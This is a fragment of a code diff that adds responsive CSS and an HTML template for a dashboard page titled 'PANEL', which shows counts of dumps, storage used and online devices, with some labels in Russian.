+  .sidebar{width:auto;height:auto;position:static;flex-direction:row;align-items:center;border-right:none;border-bottom:1px solid var(--line);overflow-x:auto}
+  .brand{border-bottom:none;padding:14px 16px;flex-shrink:0}
+  .nav-wrap{flex-direction:row;padding:8px;gap:4px;flex:1}
+  .nav{white-space:nowrap;padding:8px 12px}
+  .nav-count{display:none}
+  .side-foot{display:none}
+  .topbar{padding:18px 18px 16px;position:static}
+  .content{padding:18px 18px 48px}
+  .table-wrap{overflow-x:auto}
+  table{min-width:640px}
+  .stats{gap:16px}
+}
+</style></head>
+<body>
+<div class="shell">
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="mark">◆</div>
+      <div class="brand-name">PANEL</div>
+    </div>
+    <div class="nav-wrap">${navHtml}</div>
+    <div class="side-foot"><b>${deviceList.length}</b> устройств · <b>${onlineCount}</b> online</div>
+  </aside>
+
+  <main class="main">
+    <div class="topbar">
+      <div>
+        <div class="page-title">${titles[tab] || 'Panel'}</div>
+        <div class="page-sub">${files.length} дампов · ${fmtSize(totalSize)} · ${deviceList.length} устройств</div>
+      </div>
+      <div class="stats">
+        <div class="stat"><div class="stat-val">${files.length}</div><div class="stat-key">Dumps</div></div>
+        <div class="stat"><div class="stat-val">${fmtSize(totalSize)}</div><div class="stat-key">Storage</div></div>
+        <div class="stat"><div class="stat-val">${onlineCount}/${deviceList.length}</div><div class="stat-key">Online</div></div>
+        ${clearLink ? `<div class="stat" style="display:flex;align-items:center">${clearLink}</div>` : ''}
+      </div>
+    </div>
+    <div class="content">${body}</div>
+  </main>
+</div>
 </body></html>`;
 
   res.send(html);
